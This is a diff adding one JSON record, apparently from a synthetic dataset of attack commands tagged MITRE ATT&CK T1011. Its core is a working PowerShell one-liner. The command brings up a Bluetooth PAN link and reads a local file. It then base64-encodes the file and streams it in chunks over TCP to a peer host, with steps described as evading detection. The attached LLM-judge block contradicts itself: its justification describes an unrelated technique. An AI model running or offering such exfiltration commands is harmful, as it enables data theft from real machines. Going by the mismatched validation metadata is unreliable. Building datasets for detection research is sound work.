@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
+  "explanation": "Leverages Bluetooth PAN with a static IP and streams base64 in small chunks over a high TCP port to reduce anomalies on the alternate medium (T1011).",
+  "rationale_steps": [
+    "Establish Bluetooth NAP connectivity.",
+    "Configure Bluetooth interface with a /30 to isolate routing.",
+    "Bind TCP client to Bluetooth IP to ensure exfil over Bluetooth.",
+    "Chunk base64 payload and transmit over a nonstandard port to evade simple detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1ad2f656",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quoting/bracing, valid separators, and parseable constructs.",
+        "semantic_score": 1,
+        "semantic_justification": "It does not leverage signed system scripts or script hosts to proxy execution as described, instead configuring a Bluetooth PAN and transmitting data over TCP, which is unrelated to the provided technique.",
+        "combined_score": 3.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T22:32:34.293395Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
